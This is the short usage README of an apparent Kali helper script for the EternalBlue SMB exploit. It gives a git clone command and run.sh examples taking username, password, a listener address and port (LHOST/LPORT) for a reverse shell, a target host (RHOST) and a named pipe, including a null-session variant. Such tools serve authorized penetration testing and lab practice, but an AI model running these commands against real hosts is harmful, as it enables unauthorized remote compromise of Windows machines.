USAge:

Description: A handy script for kali box only

1. Download the repo localy:
#git clone https://github.com/Ch0pin/EternalBlue.git

2. cd EternalBlue
./run.sh <username> <password> <LHOST> <LPORT> <RHOST> <Named_pipe>"



Example 1 (known username/password) : ./run.sh 'Chopin' 'password' 10.10.10.1 4444 10.10.10.2 Browser"
Example 2 (null session): ./run.sh '' '' 10.10.10.1 4444 10.10.10.2 ''


